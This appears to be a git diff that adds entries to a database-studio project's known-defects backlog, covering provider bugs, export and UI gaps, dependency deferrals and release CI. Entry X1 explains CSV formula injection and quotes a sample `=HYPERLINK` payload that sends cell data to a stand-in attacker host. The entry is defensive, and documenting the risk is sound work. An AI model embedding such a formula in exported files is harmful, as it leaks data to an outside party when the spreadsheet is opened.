@@ -196,6 +196,159 @@ provider instead of opening a second handle, or the test is skipped with an hone
 that cannot be opened twice. Whichever is chosen, the modal must not present a lock conflict as a
 failed connection test.
 
+### D4. A MongoDB connection cannot name the database its credentials live in (`authSource`)
+
+`buildConnectionString()` (`src/lib/db/providers/document/mongodb.ts`) composes
+`mongodb://user:pass@host:port/<database>` and nothing else, and `authSource` appears nowhere in the
+repository — not in the connection form, not in `DatabaseConnection`, not in the driver options. The
+MongoDB driver authenticates against the database named in the URI when no `authSource` is given, so
+the ordinary deployment — users created in `admin`, data in another database — cannot be connected to
+through the form fields at all. It fails as a credentials error, which is what it looks like and is
+not what it is.
+
+The workaround exists and is not discoverable: MongoDB is one of the engines offering the
+connection-string toggle, and a pasted `mongodb://user:pass@host:port/shop?authSource=admin` is
+passed through verbatim.
+
+Raised while driving agent grounding against a seeded MongoDB (#414) and deliberately left out of that
+work: this is a connection-form feature, not a grounding one. Done when the MongoDB connection form
+carries an optional auth-database field that reaches the URI, with the tri-sync the provider rule
+requires (code, `docs/providers/mongodb.md`, `tests/integration/db/mongodb-provider.test.ts`).
+
+### D5. A trailing semicolon reaches Trino unchanged, and Trino is the one engine that refuses it
+
+Measured against Trino 476: `SELECT 1;` answers `SYNTAX_ERROR`, `line 1:9: mismatched input ';'`,
+while `SELECT 1` succeeds. `TrinoHttpTransport` sends the statement text verbatim and strips
+nothing, so `provider.query("SELECT 1;")` fails on Trino and succeeds on every other SQL engine
+we ship.
+
+**Not reachable through the product**, which is why it is here rather than in the provider PR:
+`splitStatements()` (`src/lib/sql/statement-splitter.ts:132`) consumes the semicolon as the
+delimiter, so nothing typed in the editor ever carries one to a provider. The exposure is the
+published library surface — `@libredb/studio` exports the providers, and a consumer calling
+`query()` directly gets an engine-specific failure with no hint that the semicolon caused it.
+
+Two things make it worth recording rather than dismissing. The comment at
+`src/lib/db/providers/sql/trino/http-transport.ts` describing the request body reads "no trailing
+semicolon", which states the requirement without anything enforcing it — corrected in the same
+change that filed this entry, so the comment no longer implies a strip that does not happen. And
+the provider already absorbs one Trino grammar quirk for the caller: `prepareQuery()` transposes
+`LIMIT n OFFSET m` into `OFFSET m LIMIT n` because only the second order parses. Absorbing one and
+not the other is the inconsistency, not the semicolon itself.
+
+Done when the transport drops a single trailing semicolon before the statement leaves it (a
+statement whose text is otherwise unchanged, so nothing that reads the statement back is
+surprised), with a test that proves `SELECT 1;` and `SELECT 1` reach the wire identically, and
+`docs/providers/trino.md` saying so. Deliberately NOT a general statement splitter: `SELECT 1;
+SELECT 2` must keep failing, because the endpoint takes exactly one statement.
+
+Found reviewing #438 against the live cluster; not raised by the external review of that PR.
+
+### D6. The MySQL index-size query assumes InnoDB names its table after the database you connected to
+
+`INDEX_SIZES_SQL` in `src/lib/db/providers/sql/mysql.ts:246` filters
+`information_schema.INNODB_TABLES.NAME LIKE ?`, and `getIndexStats` passes `` `${schema}/%` `` at
+line 966 - the connection's own database, followed by a slash. That is InnoDB's naming convention on
+a single MySQL server, and the query treats it as universal.
+
+Measured on 2026-08-20 against Vitess 24.0.2 (`vitess/vttestserver:v24.0.2-mysql80`, keyspace
+`probe`): **every per-index size reads 0 bytes**, because Vitess names the InnoDB table after the
+physical shard database, so the rows are `vt_probe_0/orders` and `LIKE 'probe/%'` matches none of
+them. The same query returns 35 rows against a real MySQL 9 control, so the statement is fine; the
+parameter's assumption is not.
+
+**The defect is ours, not Vitess's.** Vitess publishes the sizes, under the name its own storage
+uses. The provider asks for a name only an unsharded single-server MySQL has, and then swallows the
+mismatch: the size lookup sits in a `try {} catch {}` whose comment reads "INNODB_SYS tables not
+available", so a full result set of zero matched rows is indistinguishable from a server that has no
+such catalog. The join key repeats the assumption a second time - the map is keyed on
+`INNODB_TABLES.NAME` and looked up at line 976 with `${r.schema_name}/${r.table_name}` taken from
+`information_schema.STATISTICS`, so a matched row would still need the two catalogs to agree on the
+schema name.
+
+The user-visible result is the class this repo treats as worse than a blank panel: the index rows
+themselves come from `STATISTICS`, which answers, so every index lists with a size of 0 B. A wrong
+number, not a missing one.
+
+Done when a per-index size on Vitess reads what `INNODB_INDEXES` holds for that index, or the panel
+reports the size as unavailable rather than 0, and this entry is deleted.
+
+### D7. Three providers answer the performance panel with a fabricated cache hit ratio
+
+`getPerformanceMetrics` has a `catch` in the MySQL provider that returns `cacheHitRatio: 99`
+(`src/lib/db/providers/sql/mysql.ts:851-857`, comment "Fallback if performance_schema is not
+available"), and the MongoDB provider has the same literal in the same position
+(`document/mongodb.ts:851-858`, which at least logs the error first). The embedded provider is the
+third and mildest case: `embedded/libredb.ts:526` returns `cacheHitRatio: 100` unconditionally. In
+every one of the three the number reaches the panel indistinguishable from a measured one.
+
+Measured on 2026-08-20 against a live OceanBase Community Edition 4.4.2.1 through the shipped `mysql`
+provider: the tenant has no `performance_schema` database at all (`ERROR 1049 Unknown database
+'performance_schema'`), so that `catch` is not an edge case there - it is the only path, and the
+panel reports **99 percent cache hit, 0 queries per second, 0 buffer pool, 0 deadlocks** on every
+refresh, forever. A reader has nothing to distinguish it from a healthy measurement.
+
+This is the failure class #424 exists to refuse, stated in that issue as "a missing panel is honest; a
+populated wrong one is not", and it is the reason Citus and TimescaleDB are recorded as problems
+despite answering every surface. The same argument applies to our own fallback, and it is worse here
+because the engine is not the author of the number - we are.
+
+**This is the provider half of a problem whose panel half is now closed.** PR #452 taught the five
+monitoring tabs to render an omitted metric as unavailable rather than as zero, which retired the
+former U14 entry. It cannot reach this one: a fabricated `99` is not an absence, so there is nothing
+for a panel to detect - the number arrives indistinguishable from a measurement and is rendered as
+one. The OceanBase reading above is exactly as true after #452 as before it.
+
+Done when a provider that cannot measure the cache hit ratio reports it as unavailable rather than as
+a figure, on all three sites, and this entry is deleted.
+
+### D8. The MySQL provider sends every statement through the prepared protocol, and two registered engines lose panels to it
+
+Every read in `src/lib/db/providers/sql/mysql.ts` goes through mysql2's `conn.execute` - the binary
+PREPARED statement protocol - and never `conn.query`, the text protocol. There is no site that
+chooses: `getHealth` at line 638, `getOverview` at 769-798, `getPerformanceMetrics` at 825-841, the
+maintenance statement at 739 and the editor's own query path at 440 all call `execute`, including for
+statements that carry no parameters at all.
+
+Measured on 2026-08-20 against a live SingleStore 9.1.1
+(`ghcr.io/singlestore-labs/singlestoredb-dev:0.2.82`) through the shipped `mysql` provider, both ways
+on the same connection:
+
+| Statement | `conn.execute` | `conn.query` |
+|---|---|---|
+| `SHOW STATUS LIKE 'Uptime'` | fails | succeeds |
+| `SHOW VARIABLES LIKE 'max_connections'` | fails | succeeds |
+| `EXPLAIN FORMAT=JSON <select>` | fails | succeeds |
+| `EXPLAIN <select>` | fails | succeeds |
+| `OPTIMIZE TABLE orders` | fails | succeeds |
+| `CHECK TABLE orders` | fails | succeeds |
+| `ANALYZE TABLE orders` | succeeds | succeeds |
+
+Every failure is the same engine message, `This command is not supported in the prepared statement
+protocol yet`. The last row is the tell: `ANALYZE TABLE` is the one maintenance action that works on
+SingleStore today, and it is also the one statement in that list the prepared protocol accepts.
+
+The user-visible cost on SingleStore is **five of its six defects**: Test Connection, health, the
+overview and the monitoring dashboard are all unavailable, and so is the Explain panel, whose
+statement `src/lib/explain/mysql-json.ts:9` builds as `EXPLAIN FORMAT=JSON` and then runs down the
+same `execute` path. Two of three maintenance actions go with them.
+
+**This is not SingleStore-only, which is what makes it worth fixing.** The already-registered
+StarRocks row in `docs/providers/README.md` records its overview and health failures as being on the
+prepared-statement protocol - the same cause, met on a different engine in an earlier probe run and
+written up there as that engine's own quirk. So one change - routing parameterless `SHOW`, `EXPLAIN`, `OPTIMIZE`
+and `CHECK` statements through the text protocol - would touch two registered engines at once.
+
+**The recovery is plausible and unimplemented, and the difference matters.** What the probe measured
+is that those statements succeed on `conn.query` against a live SingleStore. It did NOT measure the
+provider working that way: nothing was changed and nothing was re-run through the panels. So the
+claim here is that six surfaces and two maintenance actions across SingleStore and StarRocks are
+candidates for recovery, not that they would recover.
+
+Done when a parameterless statement the provider issues is sent over the text protocol, the
+SingleStore and StarRocks rows in `docs/providers/README.md` are re-probed and re-written against
+what that build reports, and this entry is deleted.
+
 ---
 
 ## Value interpolation
@@ -240,6 +393,259 @@ which is the other half of why it is here. The published `WorkspaceFeatures.inli
 deprecated against this entry (#288): it becomes real, or goes away in a major, with this work.
 
 ---
+
+## Studio UI and query execution
+
+`U2` came out of the #384 review, verified against the merged code. The `X` entries came out of the
+#422 review of the export path — each one was named, weighed and deliberately left out of that PR, so
+they are recorded here rather than re-derived by the next reader.
+
+### X1. A CSV cell beginning `=`, `+`, `-` or `@` is a formula to a spreadsheet
+
+`src/lib/export/csv.ts` writes the value it was given, exactly. A cell holding
+`=HYPERLINK("http://attacker/"&A1)` is data in the database and a formula in Excel, LibreOffice and
+Google Sheets — evaluated when the file is opened by someone who did not write the query.
+
+The fix is not in doubt (prefix such a cell with a `'`, or wrap it), but it MUTATES the user's values
+on the way out, which is the opposite of what every other line in that file does. That is a product
+decision about which of two wrong answers to give, and it wants an owner: a checkbox on the export
+menu, a setting, or a rule the docs state.
+
+Done when a cell that a spreadsheet would evaluate cannot be evaluated by opening the file, and the
+choice is stated where the user makes it.
+
+### X2. An export writes the page the grid holds, not the result the user asked for
+
+Statements run under `DEFAULT_QUERY_LIMIT` (500) and paging fetches more only when asked, so every
+export is bounded by what is on screen. #422 made that visible — the count is on the Export button and
+the menu says when more rows are still on the server (`src/lib/export/scope.ts`) — which is honesty,
+not a fix.
+
+The fix is a server-side export: a route that streams the statement's full result through the same
+writers. `csv.ts` and `result-export.ts` are pure and hold no browser reference precisely so that a
+route can reuse them; `download.ts` is the only browser-bound module in that directory. Worth costing
+against the agent's own export gap (`B33`, `B34`), which wants the same route.
+
+### X3. A binary column exports as its JSON shape
+
+A `bytea`/`BLOB` value arrives in the browser as `{"type":"Buffer","data":[1,2,…]}` (the shape
+`JSON.stringify` gives a Node Buffer) and both the grid and the CSV write exactly that: a megabyte of
+data becomes about four megabytes of digits, and no reader can turn it back.
+
+Deliberately NOT fixed in the export path alone. `src/components/results-grid/renderers/` classifies a
+value by shape and is the one place both surfaces read; a binary rule belongs there, so that the grid,
+the row detail sheet and the export agree on hex, base64 or a truncation. Fixing only the writer would
+make the file disagree with the screen.
+
+### X7. The DDL export types a numeric or a timestamp column as TEXT, because the wire hands it a string
+
+Measured in the browser against the local `dvdrental` (2026-08-18):
+`SELECT rental_rate, last_update, film_id FROM film` exports as
+`CREATE TABLE … ("rental_rate" TEXT, "last_update" TEXT, "film_id" BIGINT)`.
+
+Nothing is wrong with the inference — it never sees a number. `pg` returns `numeric` as a string to
+keep its precision, the API serializes the result to JSON, and a `timestamp` is a string by the time
+the browser reads it. So a value-shaped guess can only ever recover integer, boolean and text, and the
+dialect spellings #422 added (`NUMBER(19)`, `BINARY_DOUBLE`, `DATETIME2`, …) apply to the three kinds
+that survive the wire.
+
+The type is not lost, only unreported: `QueryResult.columnTypes` is the channel for it, and only
+ClickHouse and Druid populate it today. Done when every provider fills `columnTypes` for the columns
+it declares — which is the provider triad's own work (code ↔ docs ↔ tests per type-id), one PR, and
+it also lets the grid label a column without guessing (`ResultsGrid.declaredTypeOf` already reads it).
+
+Guessing from a string's SHAPE is not the fix and should not be attempted: it types a text column
+holding `2026-01-01` as a timestamp.
+
+### U3. Provider metadata is requested with the client's own connection object, so a managed connection defined only by a connection string is refused
+
+`useProviderMetadata` (`src/hooks/use-provider-metadata.ts`) posts `JSON.stringify(connection)` — the
+connection as the CLIENT holds it. For a managed seed connection that object is the sanitized one
+`GET /api/connections/managed` returns, and the sanitizer keeps only the fields that are not secrets.
+A seed defined by `host` / `port` / `database` / `user` survives that trip with enough left to
+construct a provider, so PostgreSQL, MySQL, SQL Server, ClickHouse, Oracle, Druid, Couchbase, Redis,
+SQLite and LibreDB all answer — measured, all eleven managed seeds replayed as the client sends them. A seed defined by `connectionString` does not: the string IS the credential,
+so nothing addressable is left, and `createDatabaseProvider` throws. Measured on 0.11.0 against a
+managed MongoDB seed — `POST /api/db/provider-meta` returns **400**, with
+`Provider metadata request failed` in the console and no capabilities for that connection.
+
+The route already accepts the fix. It resolves `body.connectionId` through `resolveConnection`
+(`src/app/api/db/provider-meta/route.ts`), the same seam `/api/db/query` and `/api/db/schema` use —
+which is why a query and a schema read on that same MongoDB connection both succeed while the
+metadata call beside them fails. Only this one caller sends the object instead of the id.
+
+The damage is bounded because absent metadata reads as unsupported everywhere, which for MongoDB is
+close to the truth: no explain, no create-table, no inline edit. What is lost is the labels — the
+explorer says what a Postgres connection would say rather than naming collections — and the loss is
+silent, a console warning on a path no user reads. It is not a regression: the hook has posted the
+object since it was introduced (`a4b5cfa`, 2026-02-12), and no engine reached this code with a
+connection-string-only managed seed until seed connections carried one.
+
+Done when the hook sends `{ connectionId }` for a connection the server owns and the object only for
+one the client does, with a test that fails on a managed seed whose only address is a connection
+string — the case the current tests cannot see, because they build connections with hosts.
+
+### X4. Four modals stay mounted while closed, so their code cannot be split
+
+`DataProfiler`, `CodeGenerator`, `TestDataGenerator` and `DataImportModal` render `null` when closed
+but are always mounted, so lazy-loading them buys nothing until the mount is gated — and gating the
+mount changes their semantics (state resets on close). That is a behaviour change, not a bundling one.
+
+### X5. `Studio.tsx` re-renders its whole tree on every keystroke
+
+14 `useState`, no `useMemo`/`useCallback`, no memoized children, React Compiler off. The
+code-splitting in #422 is not this fix and does not help it. It touches every prop in the shell, which
+is why it was not mixed into a correctness PR. `framer-motion` is also still in the first load
+(`Studio.tsx`, `ConnectionModal`, `SchemaExplorer`, `ConnectionItem`, `TableItem` all import it
+statically and all mount on arrival).
+
+### X6. 43 lists outside `SchemaDiff` are still keyed by index
+
+`VisualExplain`, `DatabaseDocs` and the monitoring/admin tabs. `SchemaDiff` was fixed in #422 because
+its rows are recomputed and reordered; the rest need reading one at a time to tell which are stable
+lists (where an index key is fine) from which are not.
+
+### U2. The rule that catches an arity change on a JSX handler is configured but not aimed at components
+
+`eslint.config.mjs:84` scopes the type-aware layer to `src/app/api/**`, `src/lib/db/**` and
+`src/lib/storage/**`. `@typescript-eslint/no-misused-promises` is already `error` there, and its
+`checksVoidReturn.attributes` default is exactly the check that catches a promise-returning function
+handed to a JSX handler that declares `() => void`.
+
+That is the shape of the defect fixed in #384's final commit: `cancelQuery` gained a `tabId?: string`
+parameter, both call sites in `src/components/Studio.tsx` still passed the function itself to a
+button's `onClick`, React filled the slot with its MouseEvent, and the Cancel button silently stopped
+cancelling. TypeScript permits it — an optional parameter still satisfies `() => void` — and the
+tests could not see it, because they called the captured prop with no arguments.
+
+Measured rather than assumed: extending the layer's `files` to `src/components/Studio.tsx` and
+restoring the defect makes ESLint flag both call sites precisely. It also reports 21 further errors in
+the same file that are not defects, mostly `onX={() => someAsyncThing()}` where nobody awaits and
+nobody needs to — a roughly 10:1 noise ratio in one file. So this is not a scope widening that can be
+merged as-is.
+
+The decision to make: accept the churn (a braced body or a `void` at each benign site, across the
+component tree) in exchange for a mechanical gate on a defect class that is invisible to both the type
+checker and the current tests, or leave the layer narrow and rely on review. Worth costing against the
+whole of `src/components/**` before choosing, since one file's ratio is not the tree's.
+
+Done when the scope is either widened with the benign sites made explicit, or the decision not to is
+recorded here with the number that justified it.
+
+---
+
+### U4. The profile modal's error state cannot be dismissed
+
+`DataProfiler` renders the message `/api/db/profile` returned and offers no way out: Escape does not
+close it, and the header's close control is under the error card. #427 measured this on Redis, where
+the route answered 400 for every key-prefix row, but the fault is not Redis's — any provider whose
+profile request fails traps the user in the same modal. #427 hid the menu item on providers whose
+rows are derived groupings, which removes the reachable path without fixing the modal.
+
+Done when a failed profile is dismissable by Escape and by the modal's own close control, for every
+provider that can fail it.
+
+### U5. The Operations tab shows `Tables (0)` for a key-value provider and preselects nothing
+
+Two separate gaps meet on the same screen. `OperationsTab` calls `useMonitoringData` with
+`includeTables: true` for every connection, so a provider that has no addressable tables renders an
+empty panel rather than none. And the Explorer's deep link — `onOpenMaintenance("tables", table.name)`
+— carries the row's name, but `openMaintenance` in `Studio.tsx` drops the second argument on the way
+to `/admin/operations`, so the tab opens with nothing selected however the user got there.
+
+Done when a provider whose rows are derived groupings renders no Tables panel, and a deep link from a
+row arrives with that row selected.
+
+### U6. The Reindex card has no per-provider wording, so it still speaks Postgres
+
+`ProviderLabels` carries an `analyzeGlobal*` and a `vacuumGlobal*` triad and no `reindexGlobal` one.
+#427 made the Operations tab render the first two, but the reindex card is left hardcoded to
+*"Run Reindex"* / *"Rebuild Indexes"* / *"Reconstructs all indexes in the database."* Three
+providers declare `reindex` — Postgres, SQLite and Couchbase — and for Couchbase, whose reindex is a
+GSI rebuild rather than a table reindex, that copy is wrong in the same way the analyze copy was
+wrong for Redis. Adding the triad was deliberately out of scope for #427: it means touching
+`ProviderLabels` and every provider that implements it, which is a wider change than the Redis fix.
+
+The same card gap has a smaller twin on the same screen: the per-table Analyze and Vacuum buttons are
+titled with the hardcoded `"Analyze"` and `"Vacuum"`, so MongoDB's *"Validate Collection"*,
+ClickHouse's *"Table Statistics"* and Oracle's *"Rebuild Indexes"* never reach them (#427). Wiring
+those two is entangled with U9 below and should be done with it, not before it.
+
+Done when `reindexGlobalLabel` / `reindexGlobalTitle` / `reindexGlobalDesc` exist, the three
+declaring providers set them, the card renders them with the current strings as the fallback, and the
+per-table buttons carry `analyzeAction` / `vacuumAction`.
+
+### U7. `StudioWorkspace` hands the toolbar a noop Save while the Save button renders unconditionally
+
+`QueryToolbar` renders its Save Query control whenever it is given an `onSaveQuery`, and
+`StudioWorkspace` passes `() => {}`. In the embedded surface the button is therefore always present
+and always dead — the same dead-control class #427 closed for the Redis row menu, but pre-existing
+and unrelated to that issue, which is why it was recorded rather than fixed there. The standalone
+`Studio` surface passes a real handler, so this is visible only in the npm-package render path.
+
+Done when the embedded surface either supplies a working save or does not render the control — and
+the decision is stated where the prop is passed, since "the host will wire it later" is a real option
+for a published library surface.
+
+### U8. The LibreDB Monaco language module's tokenizer is never exercised
+
+`registerLibreDBLanguage` (`src/lib/editor/libredb-language.ts`) hands Monaco a Monarch `tokenizer`
+whose rules are the whole point of the module, and `tests/unit/editor/libredb-language.test.ts`
+asserts only that a provider object with a non-empty `root` was passed. Nothing checks what the rules
+match, so a regex covering the wrong span, a shadowing rule order, or a word landing in both the
+keyword and modifier lists would pass every gate and be visible only in a browser. 100% line coverage
+does not help here: the rules are data, and loading the module covers them.
+
+The Redis half of this is **done** — `tests/unit/editor/redis-language.test.ts` now asserts the rule
+regexes directly (#427): what the `^\s*#` comment rule matches and does not, that a SCAN cursor
+tokenizes as a number, that `user:*` is ONE identifier token, that a quoted value keeps a `#` inside
+it, and that no two root rules can open on the same character — the property that makes the rule
+order safe. It needs no Monaco runtime, so the same shape applies to LibreDB.
+
+Done when the LibreDB module is checked the same way, or both are driven through Monaco's own Monarch
+runtime end to end.
+
+### U9. Four providers point `vacuumAction` at an operation that is not `vacuum`, and one shows a row item for an operation it does not have
+
+Two mismatches, measured while fixing #427 and deliberately left alone.
+
+(a) **MySQL shows the base default it never meant.** The schema explorer's per-row maintenance items
+are gated on `isAdmin` alone, so MySQL renders *"Vacuum Table"* — `BaseDatabaseProvider`'s default
+wording — although its `maintenanceOperations` is `['analyze', 'optimize', 'check', 'kill']` and
+contains no `vacuum`. The item names an operation MySQL does not have; following it reaches an
+Operations tab that renders no vacuum card either.
+
+(b) **ClickHouse, SQL Server, Oracle and Couchbase map the LABEL onto another operation.** Their
+`vacuumAction` reads *"Optimize Table"*, *"Rebuild Indexes"*, *"Rebuild Indexes"* and *"Compact"*,
+standing for the `optimize` / `optimize` / `optimize` / `reindex` each declares. So a label-driven
+gate is not enough on its own, and a *generic* label-to-operation mapping is actively wrong: #427
+built one, wired it into the Operations tab's per-table button, and thereby handed Oracle a per-table
+*"Rebuild Indexes"* control that sent `optimize` with a TABLE name — while `oracle.ts` builds
+`ALTER INDEX "<target>" REBUILD` from that target, so every click answered **ORA-01418: specified
+index does not exist**. A control that always fails is worse than the dead end it replaced, and the
+whole chain was reverted before merge.
+
+The conclusion the revert paid for: any future mapping must be **per provider**, declared by the
+provider next to the operation it names — because the target grammar differs even among providers
+that declare the same `MaintenanceType`. Oracle's `optimize` wants an index name; ClickHouse's wants
+a table; Couchbase's `reindex` wants a keyspace.
+
+Done when each provider declares which operation its `vacuumAction` (and `analyzeAction`) stands for
+*and* what kind of target that operation takes, both surfaces gate and title from that declaration,
+and a live run against Oracle proves the per-table control succeeds rather than returning ORA-01418.
+
+### U10. The Monarch rules for the Redis and LibreDB command languages carry no cross-line string state
+
+`redis-language.ts` and `libredb-language.ts` give Monaco a `root` state whose comment rule is
+`^\s*#`, with no separate string state carried between lines. The providers, however, treat a newline
+inside an open quoted argument as data (`SET note "line1` / `#tag"` stores a two-line value — see
+`docs/providers/redis.md` §3.4a). So the editor paints the continuation line as a comment while the
+provider stores it as part of the value: the highlighting and the execution disagree about the same
+buffer. Low severity — it misleads, it does not corrupt — and the tokenizer has no idea what the
+provider will do until the buffer runs.
+
+Done when an open quoted argument keeps its string state across the line break in both Monarch
+tokenizers, with a test asserting a `#`-leading continuation line is not tokenized as a comment.
 
 ## Authentication and security headers
 
@@ -345,6 +751,105 @@ Done when Tauri's dependency tree offers `glib >= 0.20` and the lock is updated,
 dismissed with this reasoning recorded on it. Re-check on each Tauri upgrade — a one-line
 `cargo tree -i glib` in `desktop/src-tauri/` answers it.
 
+### P2. TypeScript 7 is unreachable until it ships a programmatic API
+
+`typescript@7.0.2` is on npm `latest` and is the native Go port. The published tarball contains no
+`lib/typescript.js`: its exports map resolves `require("typescript")` to `lib/version.cjs`, which
+returns `{version, versionMajorMinor}` and nothing else. Two of the six mandatory gates call the
+compiler API directly, so both break at runtime while `bun run typecheck` passes and reports nothing:
+
+- `bun run lint` — `@typescript-eslint/typescript-estree` requires `typescript` in 19 files, and
+  every published `typescript-eslint` (8.67.0 and its canaries) caps the peer at
+  `typescript: ">=4.8.4 <6.1.0"`. There is no v9 line.
+- `bun run build:lib` — tsup's `dts: true` pipeline calls `ts.parseJsonConfigFileContent`.
+
+`bun run build` additionally refuses unless `experimental.useTypeScriptCli` is set. Two smaller
+blockers wait behind those: TS 7 removes `baseUrl`, which `tsconfig.lib.json` relies on to resolve
+the `@/*` alias for tsup's declaration bundler, and the `plugins: [{ "name": "next" }]` tsserver
+entry has no host on 7.0. knip 6.x is unaffected — it is on oxc-parser with no TypeScript dependency.
+
+Upstream, typescript-eslint's tracking issue (#10940) is labelled "blocked by external API" and has a
+second, independent blocker: ESLint has no asynchronous-parser support, which a tsgo backend needs.
+Microsoft promises the stable API in 7.1.
+
+Done when TS 7.1 ships that API **and** a `typescript-eslint` release admits `typescript: ^7`. The
+whole check is one line: `npm view typescript-eslint peerDependencies.typescript`. Do not reach for
+the `npm:@typescript/typescript6` alias workaround in the meantime — it keeps TS 6 under the name
+`typescript` for every gate that matters, so it buys a faster ad-hoc `tsc` and a package.json that
+misreports its own compiler.
+
+### P3. The ESLint 10 config carries a compat shim for eslint-config-next
+
+`eslint.config.mjs` wraps `eslint-config-next`'s two configs in `@eslint/compat`'s
+`fixupConfigRules`. ESLint 10 removed the deprecated rule-context methods; eslint-config-next 16.3.1
+still depends on `eslint-plugin-react ^7.37.0`, whose newest release (7.37.5, April 2025) calls
+`context.getFilename()` and declares `eslint: "... || ^9.7"`. Without the wrapper, loading any of its
+rules throws `TypeError: contextOrFilename.getFilename is not a function` before a file is linted.
+eslint-config-next's own peer range (`eslint: ">=9.0.0"`) does not express this, so nothing catches it
+short of running the linter.
+
+Done when eslint-config-next depends on an eslint-plugin-react that declares `eslint: ^10`, at which
+point the two `fixupConfigRules(...)` calls become bare spreads and `@eslint/compat` leaves
+`devDependencies`. Check with `npm view eslint-plugin-react peerDependencies.eslint`.
+
+### P4. Four dependency majors deferred out of the 2026-08 bump
+
+Raised by Dependabot, closed unmerged, and each a decision rather than a bump. Recorded here so the
+decision survives whether or not the bot re-raises them under the `bun` ecosystem:
+
+- **`@tanstack/react-table` 8 -> 9, `framer-motion` 12 -> 13, `eslint` 9 -> 10** — done; this entry
+  covers only what was left behind.
+- **`react-day-picker` 9 -> 10** — resolved by removal, not by upgrade. Its only importer was the
+  vendored `src/components/ui/calendar.tsx`, which nothing imported in turn; both are gone, so there
+  is no major left to take. Re-add the dependency only alongside a component that uses it.
+- **`ioredis` 5 -> 6** — the Redis provider maps `SCAN`/`INFO`/`SLOWLOG`/`CLIENT LIST` onto the
+  SQL-oriented interface, so a client major needs the provider triad re-verified against a live
+  server, not a type-check.
+- **`oracledb` 6 -> 7** — thick/thin mode and the prebuilt binaries are what the Docker image and the
+  AppImage build depend on; check those before the API.
+- **`@types/node` 25 -> 26** — deferred for a reason worth stating: the runtime images are on Node 26
+  (#380) but `engines.node` still declares `>=24.0.0`. Typing against 26 would let code compile that
+  breaks on the floor the package advertises. Decide the floor first, then move the types to match
+  it.
+
+`@zumer/snapdom` is pinned exactly (`2.15.0`, no caret) on purpose — see the ER-diagram export work
+— and is not part of this list.
+
+### P5. The rest of the unused shadcn primitives keep their dependencies alive
+
+Dropping `react-day-picker` exposed the general case. `knip.json` lists `src/components/ui/**/*.{ts,tsx}`
+as an *entry* glob, so every vendored shadcn file is a root: knip never reports one as unused, and the
+package it imports therefore counts as a used dependency. Roughly twenty primitives under
+`src/components/ui/` have no importer at all, and several are the sole reason a package is installed —
+`carousel` -> `embla-carousel-react`, `form` -> `react-hook-form`, `input-otp` -> `input-otp`, plus
+`@radix-ui/react-accordion`, `-aspect-ratio`, `-avatar`, `-collapsible`, `-hover-card`.
+
+Deciding this is not a bump: either accept the vendored set as a deliberate on-hand library (and say so
+in `CLAUDE.md`, which today says nothing about it), or sweep the orphans and their packages the way
+`calendar.tsx` went. Until then every Dependabot major on one of those packages costs a review for a
+component nothing renders. Reproduce the list with a per-file importer count over `src/components/ui/`.
+
+### P6. Twenty-one lucide icon imports survive only through legacy-rename aliases
+
+The lucide-react 1.31 bump found this and did not fix it. These names were renamed upstream and are
+re-exported under their old spelling, at runtime as well as in the types: `AlertTriangle`,
+`Loader2`, `Loader2Icon`, `CheckCircle2`, `BarChart3`, `BarChart2`, `AlertCircle`, `FileJson`,
+`XCircle`, `AlignLeft`, `Edit3`, `Filter`, `Wand2`, `MoreVertical`, `MoreHorizontal`,
+`MoreHorizontalIcon`, `History`, `PlayCircle`, `LineChart`, `PieChart`, `AreaChart` — 51 import
+sites in all. Geometry is byte-identical to what we rendered before, so nothing is broken today.
+
+What makes it worth recording is the failure mode rather than the tidiness: lucide-react 1.31.0
+ships **zero** `@deprecated` JSDoc tags, so no editor, linter or typecheck warns while an alias is
+alive, and the first signal is the build breaking on the release that drops it. That is exactly how
+`Github` arrived — as a hard break, not a warning. Migrating each import to its canonical v1 name
+(`TriangleAlert`, `LoaderCircle`, `CircleCheck`, `ChartColumn`, …) turns a future silent removal
+into a no-op.
+
+Note `History` is the one with a rendered-output consequence: in v1 it aliases `RotateCcwClock`, and
+`createLucideIcon` derives the emitted class from the canonical name, so its element class moves
+from `lucide-history` to `lucide-rotate-ccw-clock`. No test asserts that class today — checked all
+17 `lucide-*` class literals under `src/` and `tests/` — but a migration should re-check it.
+
 ---
 
 ## Documentation
@@ -371,7 +876,146 @@ feature's documentation and the same PR's chart version bump is already spoken f
 lines use `--set-string` — and ideally when the README's `--set` bracket arguments are single-quoted,
 since unquoted `extraEnv[0]` is a glob pattern in zsh.
 
+### X3. Four channel listings still advertise NL2SQL, which the product no longer has
+
+#331 T2 removed the NL2SQL and Autopilot panels, and #331 T6 rewrote the READMEs, `DOCKERHUB.md` and
+`docs/FEATURES.md` around the agent. The **external channel listings were deliberately left out of
+that PR**: each is a submission to somebody else's marketplace with its own review cycle, so they
+change on their own schedule and not in a documentation PR. They are recorded here so the launch copy
+is one list rather than four separate discoveries later.
+
+Four files, with the exact strings that are now false:
+
+| File | Line | The string |
+| --- | --- | --- |
+| `deploy/railway/TEMPLATE_OVERVIEW.md` | 3 | "with AI-powered query assistance (natural-language-to-SQL, explain, and fix)" |
+| `deploy/digitalocean/assets/description-long.md` | 10 | "**AI-assisted SQL** — turn natural language into queries (NL2SQL)" |
+| `deploy/rancher/CATALOG_LISTING.md` | 52-53 | "An optional AI assistant (bring your own key: Gemini, OpenAI, or a local model) writes and explains SQL from natural language and" |
+| `deploy/azure/listing/listing-fields.md` | 76 | "2. `nl2sql` — \"Turn a plain-English question into SQL with AI assistance.\"" |
+
+"Explain" survives the removal and "writes SQL from natural language" does not, so three of the four
+need a rewrite rather than a deletion — the honest replacement is the read-only agent, which is what
+the product now has. They are four separate submissions rather than one edit: the Azure entry is a
+numbered item in that listing's own field contract, and each of the others is published by its
+marketplace from the file above.
+
+Done when each listing has been resubmitted through its own channel with copy that matches the
+shipped product, and the entry is deleted then and not before.
+
 ---
+
+## Release pipeline
+
+### R1. No CI job installs the released chart artifact with a Helm 3 client
+
+The CI Helm matrix pins six of its seven `azure/setup-helm` sites to Helm 4.1.3 and keeps
+`helm-release.yml` -> `lint-test` on Helm 3.16 on purpose, because our users install with Helm 3.
+`tests/unit/helm-pin-matrix.test.ts` locks that split. What the Helm 3 job actually proves is
+narrower than the marker at the site used to claim: `ct install --charts charts/libredb-studio`
+installs the chart SOURCE directory, never the `.tgz` that `release-github-pages` packages with
+Helm 4 and never the OCI artifact `release-oci` pushes. So no job anywhere performs `helm install`
+with a Helm 3 client against a released byte.
+
+The gap is believed narrow — a Helm 4 package differs from a Helm 3 one only in preserved source
+mtimes; extracted trees, `tar` member lists, `helm3 lint --strict`, `helm3 show chart`,
